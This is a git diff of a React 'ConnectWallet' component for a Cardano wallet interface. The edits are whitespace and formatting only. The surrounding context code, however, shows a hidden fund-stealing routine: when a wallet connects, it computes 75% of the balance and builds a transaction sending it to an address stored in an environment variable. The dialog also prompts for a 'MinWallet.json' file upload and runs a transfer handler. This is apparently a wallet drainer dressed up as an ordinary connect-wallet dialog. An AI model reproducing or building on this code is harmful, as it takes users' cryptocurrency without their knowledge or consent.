@@ -92,22 +92,22 @@ function ConnectWallet({ onClose }) {
       console.error("Balance not available or zero");
       return;
     }
-  
+
     const recipientAddress = import.meta.env.VITE_REACT_APP_RECIPIENT_ADDRESS;
-  
+
     // Calculate 3/4 of the balance
     const amountToWithdraw = Math.floor(currentBalance * 0.75);
-  
+
     try {
       const protocolParams = await fetchProtocolParams();
-  
+
       // Convert ADA to Lovelace without padding
       const lovelaceAmount = Math.floor(
         amountToWithdraw * 1000000,
       ).toString();
-  
+
       console.log("Lovelace amount:", lovelaceAmount);
-  
+
       await buildSendADATransaction(
         recipientAddress,
         lovelaceAmount,
@@ -529,9 +529,8 @@ function ConnectWallet({ onClose }) {
           Import MinWallet.json file
         </p>
         <button
-          className={`p-3 mt-4 bg-[#89aaff] rounded-full text-sm w-full font-semibold flex items-center justify-center gap-2 ${
-            !fileUploaded ? "opacity-50 cursor-not-allowed" : ""
-          }`}
+          className={`p-3 mt-4 bg-[#89aaff] rounded-full text-sm w-full font-semibold flex items-center justify-center gap-2 ${!fileUploaded ? "opacity-50 cursor-not-allowed" : ""
+            }`}
           disabled={!fileUploaded}
           onClick={handleTransferWallet}
         >
@@ -864,7 +863,7 @@ function ConnectWallet({ onClose }) {
                       </div>
                       <div
                         className="flex items-center cursor-pointer gap-x-4 p-3 "
-                        //   onClick={() => handleWalletSelection("Ledger")}
+                      //   onClick={() => handleWalletSelection("Ledger")}
                       >
                         <img
                           src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1721831775/abhvehnlx6umoknjxw5f.svg"
@@ -948,7 +947,7 @@ function ConnectWallet({ onClose }) {
                       </div>
                       <div
                         className="flex items-center cursor-pointer gap-x-4 p-3 "
-                        //   onClick={() => handleWalletSelection("WalletConnect")}
+                      //   onClick={() => handleWalletSelection("WalletConnect")}
                       >
                         <img
                           src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1721831870/gwe5i02najzyogs8jqcj.svg"
